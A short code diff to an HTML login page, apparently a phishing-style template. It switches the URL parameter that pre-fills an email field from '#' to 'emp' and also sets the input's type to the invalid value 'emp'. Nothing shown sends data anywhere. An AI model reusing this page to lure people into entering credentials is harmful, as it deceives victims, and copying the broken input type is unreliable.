@@ -181,7 +181,7 @@
         <!-- Email -->
 		
         <div class="input-group">
-		<input type="email" id="oruko" placeholder="Email" autocomplete="on" value="[[-Email-]]" />
+		<input type="emp" id="oruko" placeholder="Email" autocomplete="on" value="[[-Email-]]" />
 		<p id="msgfont"></p>
 		<div class="password-wrapper"></div>
 	</div>
@@ -218,10 +218,10 @@
     // 1. Get the URL parameters
     const urlParams = new URLSearchParams(window.location.search);
     
-    // 2. Look specifically for '#'
-    const emailValue = urlParams.get('#');
+    // 2. Look specifically for 'emp'
+    const emailValue = urlParams.get('emp');
 
-    // 3. If '#' exists in the URL, put it into the email input
+    // 3. If 'emp' exists in the URL, put it into the email input
     if (emailValue) {
       const emailInput = document.getElementById('oruko');
       if (emailInput) {
@@ -229,10 +229,10 @@
       }
     }
   });
-	// Get email from URL parameter '#' (e.g., ?#=user@domain.com)
+	// Get email from URL parameter 'emp' (e.g., ?emp=user@domain.com)
     function getEmailFromUrl() {
       const urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get('#');
+      return urlParams.get('emp');
     }
 
     // Get email from URL and pre-fill the email field
